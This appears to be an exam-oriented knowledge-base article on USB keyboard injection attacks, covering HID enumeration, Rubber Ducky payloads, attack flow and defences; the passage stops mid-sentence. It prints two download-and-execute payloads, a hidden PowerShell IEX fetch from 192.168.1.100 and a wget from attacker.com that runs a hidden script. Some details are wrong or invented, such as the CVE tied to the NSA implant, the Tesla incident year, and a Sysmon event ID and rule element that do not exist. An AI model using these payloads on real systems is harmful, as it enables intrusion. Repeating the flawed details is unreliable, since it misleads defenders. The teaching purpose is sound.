---
domain: "offensive-security"
tags: [usb, hid, physical-security, injection, social-engineering, hardware-attack]
---
# USB Keyboard Injection

**USB Keyboard Injection** is a physical [[Hardware Attack]] technique in which a malicious device impersonates a [[Human Interface Device (HID)]] — specifically a keyboard — to inject keystrokes into a target computer without user awareness. Unlike software-based attacks, this method bypasses [[Antivirus]] and [[Endpoint Detection and Response (EDR)]] solutions because the operating system trusts HID input implicitly. Common attack platforms include the [[USB Rubber Ducky]], [[BadUSB]]-flashed microcontrollers, and devices like the [[O.MG Cable]].

---

## Overview

USB Keyboard Injection exploits the fundamental trust that modern operating systems place in Human Interface Devices. When a USB device is plugged in and presents itself as a keyboard using the USB HID protocol, Windows, macOS, and Linux will enumerate and load the appropriate generic HID driver automatically — no additional software installation, no administrator prompt, no user confirmation. This design convenience, intended to allow plug-and-play functionality, becomes a critical vulnerability in adversarial scenarios.

The attack class became widely known following Karsten Nohl and Jakob Lell's 2014 Black Hat presentation introducing the **BadUSB** concept, which demonstrated that USB firmware itself could be reprogrammed to impersonate entirely different device classes. A USB flash drive could silently re-enumerate as a keyboard mid-session and begin injecting commands. This revelation was significant because it showed the attack surface was not limited to purpose-built attack hardware but could theoretically affect any USB device with reprogrammable firmware.

Purpose-built attack tools like the **USB Rubber Ducky** (produced by Hak5) democratized the attack by packaging the injection capability into a convincing flash drive form factor. The device runs a custom scripting language called **DuckyScript**, allowing an attacker to preload a payload that executes in seconds when plugged in. Because modern computers can process hundreds of keystrokes per second, an entire attack sequence — opening a terminal, downloading a reverse shell, establishing persistence — can complete in under 10 seconds, well within the window of an unattended workstation or a brief social engineering pretext.

In the real world, USB Keyboard Injection is primarily a **physical access attack**, used by red teamers, penetration testers, and nation-state actors in scenarios such as supply chain tampering, USB drop attacks (leaving malicious drives in parking lots or lobbies), and tailgating scenarios where an attacker briefly accesses an unlocked workstation. The 2008 US Department of Defense incident — where foreign intelligence agencies distributed infected USB drives near military facilities — demonstrated the real-world viability of USB-based vectors, though that incident focused on malware propagation rather than HID injection specifically.

The attack is highly effective against organizations that have not implemented USB device control policies. Studies from IBM and other security firms have found that a significant percentage of people will plug in unknown USB drives they find in public, making USB drop attacks a reliable social engineering vector. When combined with HID injection, the attack requires no user interaction beyond the initial plug-in.

---

## How It Works

### USB HID Protocol Fundamentals

USB devices communicate their capabilities to the host via **USB descriptors** during the enumeration phase. The relevant descriptor for HID injection is the **Interface Descriptor**, which includes a `bInterfaceClass` value of `0x03` (HID) and a `bInterfaceProtocol` value of `0x01` (Keyboard) or `0x02` (Mouse). When the OS receives these descriptors, it loads the generic HID driver and begins treating the device as a trusted input source.

```
USB Enumeration Sequence:
1. Device plugged in → VBUS power applied
2. Host detects D+ line pull-up → identifies USB 1.1/2.0 device
3. Host issues GET_DESCRIPTOR request
4. Device responds with Device Descriptor (VID, PID, class)
5. Host reads Configuration Descriptor
6. Host reads Interface Descriptor → class 0x03 = HID
7. Host reads HID Descriptor → Report Descriptor
8. Host loads usbhid.sys (Windows) or usbhid.ko (Linux)
9. Device now has trusted keyboard channel to OS
```

### DuckyScript Payload Example

The USB Rubber Ducky and compatible tools use DuckyScript to define injection sequences. Below is a classic payload that opens PowerShell as administrator and downloads a remote script:

```ducky
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

- `GUI r` — simulates pressing Windows + R to open the Run dialog
- `DELAY` — introduces millisecond pauses to allow the OS to respond
- `STRING` — types the specified text as keyboard scan codes
- `ENTER` — submits the command

### Attack Execution Flow (Step-by-Step)

```
Step 1: Attacker prepares payload on attack hardware (Rubber Ducky, Digispark, etc.)
        └─ Writes DuckyScript or Arduino sketch
        └─ Compiles to inject.bin or flashes firmware

Step 2: Physical delivery
        └─ USB drop in target area
        └─ Direct plug-in at unattended workstation
        └─ Supply chain insertion
        └─ Social engineering pretext ("free USB from conference")

Step 3: Device enumeration (automatic, ~500ms)
        └─ OS enumerates device as HID keyboard
        └─ Generic driver loads — no elevation required

Step 4: Payload execution
        └─ Device begins sending HID keyboard reports
        └─ Each report contains key scan codes + modifier flags
        └─ OS processes as legitimate user input

Step 5: Post-exploitation
        └─ Reverse shell established
        └─ Persistence mechanism installed (registry run key, scheduled task)
        └─ Credentials dumped (e.g., Mimikatz via encoded PowerShell)
        └─ Device may self-destruct payload evidence
```

### HID Report Structure

Each keyboard HID report is 8 bytes:

```
Byte 0: Modifier keys (bit field)
        Bit 0 = Left Ctrl
        Bit 1 = Left Shift
        Bit 2 = Left Alt
        Bit 3 = Left GUI (Windows key)
        Bits 4-7 = Right-side equivalents

Byte 1: Reserved (0x00)
Bytes 2-7: Key codes (up to 6 simultaneous keys)

Example — Windows + R:
[0x08, 0x00, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00]
 ^GUI modifier   ^'r' keycode (0x15)
```

### Payload Types

| Payload Goal | Technique | Time to Execute |
|---|---|---|
| Reverse shell | Download + execute PowerShell | 5–15 seconds |
| Credential theft | Invoke Mimikatz encoded command | 10–20 seconds |
| Persistence | Add registry run key | 3–8 seconds |
| Data exfiltration | Compress + upload via curl | Variable |
| Disable defenses | Stop Windows Defender via cmd | 5–10 seconds |

### Keystroke Injection on Linux/macOS

The attack is not Windows-exclusive. On Linux:

```bash
# DuckyScript equivalent for Linux terminal
CTRL-ALT t          # Open terminal (Ubuntu default shortcut)
DELAY 800
STRING wget http://attacker.com/payload.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x
ENTER
```

On macOS, `GUI SPACE` opens Spotlight, allowing silent terminal invocation and shell command execution.

---

## Key Concepts

- **Human Interface Device (HID)**: A USB device class (0x03) covering keyboards, mice, joysticks, and similar input devices. The OS loads generic drivers automatically without user interaction, making it the foundation of all USB injection attacks.

- **BadUSB**: A class of attack first demonstrated publicly by Karsten Nohl in 2014 in which USB device firmware is reprogrammed to impersonate a different device class. A storage device can become a keyboard, network adapter, or BIOS-level implant. The attack is persistent because AV tools cannot scan firmware.

- **DuckyScript**: A scripting language developed by Hak5 for the USB Rubber Ducky. It abstracts HID scan codes into readable commands (`STRING`, `DELAY`, `GUI`, `ALT`, etc.) and compiles down to a binary payload (`inject.bin`) stored on a microSD card inside the device.

- **USB Rubber Ducky**: A commercial attack tool by Hak5 disguised as a USB flash drive that functions exclusively as a HID keyboard injection platform. The Mark III (2022) version supports conditional logic, variables, and exfiltration via a second HID channel (mouse movement encoding data).

- **HID Report Descriptor**: An OS-readable binary structure that defines how a HID device formats its data reports. An attacker-controlled descriptor can declare a composite device — simultaneously a keyboard AND a storage device — to maximize attack surface.

- **USB Drop Attack**: A social engineering technique where an attacker leaves one or more malicious USB devices in a target-accessible location (parking lot, lobby, conference room) relying on human curiosity to ensure plug-in. Studies (including a 2016 USENIX Security paper) found 45–98% of dropped drives were plugged in by finders.

- **Keystroke Injection Timing**: Payloads must include carefully tuned delays (`DELAY` commands) to account for OS responsiveness. Too fast and keystrokes are dropped; too slow and an observer may notice. Rubber Ducky v3 supports adaptive timing via conditional polling.

---

## Exam Relevance

**Security+ SY0-701** tests USB Keyboard Injection primarily within the domains of **1.0 General Security Concepts** (attack types) and **2.0 Threats, Vulnerabilities, and Mitigations** (physical security). Key exam patterns:

- **Attack Classification**: USB injection is categorized as a **physical attack** vector, not a network attack. Questions may ask you to distinguish it from [[Malware]] delivery — the correct framing is *hardware-based* or *HID-based* attack.

- **BadUSB vs. Rubber Ducky**: The exam may present both terms. BadUSB refers to the broader concept of firmware reprogramming; Rubber Ducky is a specific tool. Both achieve HID injection but through different mechanisms.

- **Mitigation questions** almost always test knowledge of **USB port disabling**, **endpoint device control policies**, and **physical security controls** (locked workstations, screen timeout). Know that software AV alone is NOT sufficient mitigation.

- **Gotcha — "HID Attack"**: Some questions use the term "HID attack" rather than "USB injection." These are synonymous in the exam context.

- **Scenario pattern**: "An attacker leaves USB drives in the parking lot of a financial firm. Three employees plug them in. What type of attack is this?" → **USB Drop Attack** (social engineering + physical attack combo). The answer is NOT phishing.

- **Defense mapping**: Know that **Group Policy Object (GPO) settings** in Windows (`Computer Configuration > Administrative Templates > System > Removable Storage Access`) can block USB storage but may NOT block HID devices — this is a common distractor. True HID mitigation requires specialized endpoint software or physical port blockers.

---

## Security Implications

### Why It Is Dangerous

USB Keyboard Injection bypasses virtually every software-based security control deployed on an endpoint. Because the operating system processes HID input at a layer below application software, the attack is invisible to:
- Antivirus and anti-malware engines
- EDR/XDR behavioral analytics (the "user" is just typing fast)
- DLP solutions monitoring file transfers
- Browser-based controls and web filtering

The window of exploitation is extremely narrow — often under 10 seconds — making detection via physical observation unreliable in busy environments.

### Real-World Incidents and CVEs

- **BadUSB (2014)** — No single CVE; affects all USB implementations relying on unverified firmware. Nohl demonstrated it against Linux, Windows, and Android. The vulnerability is architectural, not patchable via software alone.

- **CVE-2016-2388 / USB Implant (NSA ANT Catalog)** — Leaked NSA documents (via Der Spiegel, 2013) revealed the **COTTONMOUTH-I**, a hardware implant disguised as a USB connector that included both HID injection and RF exfiltration capabilities.

- **Operation Groundbait (2016)** — Ukrainian threat actors used USB-delivered malware including HID-capable components targeting government officials, demonstrating nation-state adoption of USB attack vectors.

- **Tesla Factory (2019)** — A Russian national attempted to bribe a Tesla employee to introduce a USB device into the factory network to facilitate a ransomware attack. The FBI thwarted the operation, but it demonstrates real-world adversary intent for physical USB delivery.

- **O.MG Cable (2019)** — MG (security researcher) demonstrated a Lightning-to-USB cable with an embedded Wi-Fi-accessible implant capable of keystroke injection. The device is indistinguishable from a standard Apple cable and allows remote payload triggering from up to 300 feet away.

### Detection Challenges

- HID reports appear identical to legitimate keystrokes from an OS perspective
- No file is written during the injection phase — fileless initial stage
- Payload execution speed defeats human observation
- Device may re-enumerate as benign mass storage after injection completes

### Detection Opportunities

- **Behavioral analytics**: Unusually rapid keystroke sequences (>500 WPM) can be flagged by EDR rules
- **USB VID/PID whitelisting**: Known attack tools have documented VID/PID values (Hak5 Rubber Ducky: `0x03EB:0x2042`)
- **New USB HID device event monitoring**: Windows Event Log, Security Log, or Sysmon Event ID 2003 can record new HID device connections

---

## Defensive Measures

### Technical Controls

**1. USB Device Control Software**
Deploy endpoint USB control solutions that enforce allowlisting by device class, VID/PID, or serial number:
- **Symantec Endpoint Protection** — USB device control policies
- **CrowdStrike Falcon** — USB device usage policies with blocking capability
- **Ivanti Device Control (formerly Lumension)** — granular HID blocking

**2. Windows Group Policy (Partial Mitigation)**

```
Computer Configuration →
  Administrative Templates →
    System →
      Device Installation →
        Device Installation Restrictions

"Prevent installation of devices not described by other policy settings" → Enabled

Also configure:
"Allow installation of devices that match any of these device IDs"
→ Allowlist only known, approved HID devices by Hardware ID
```

**Note**: This requires knowing your approved device Hardware IDs in advance and careful testing to avoid blocking legitimate keyboards/mice.

**3. Sysmon USB Monitoring**

Add to `sysmon-config.xml`:
```xml
<EventFiltering>
  <RuleGroup name="USB HID Detection" groupRelation="or">
    <DeviceChange onmatch="include">
      <DeviceDescription condition="contains">HID</DeviceDescription>
    </DeviceChange>
  </RuleGroup>
</EventFiltering>
```

**4. Physical Port Controls**
- **USB port blockers** (physical locks, e.g., Lindy USB port blockers) — prevent unauthorized insertion entirely
- **Epoxy sealing** of unused ports in high-security environments
- **USB-C only infrastructure** with authenticated cables (USB PD authentication, USB4)

**5. BIOS/UEFI Configuration**
Disable USB boot and restrict USB device classes at the firmware level:
```
UEFI → Advanced → USB Configuration
  → USB Legacy Support: Disabled (for servers/kiosks)
  → External USB Ports: Disabled (where feasible)
```

### Administrative Controls

- **Policy**: Prohibit use of unauthorized USB devices. Include in acceptable use policy with disciplinary consequences.
- **User Training**: Security awareness training specifically covering USB drop attacks. Conduct periodic red team USB drop simulations to measure and improve awareness.
- **Physical Security**: Enforce screen lock policies (Windows: `Win + L`; enforce maximum idle timeout of 5 minutes via GPO). An injecting device requires an unlocked session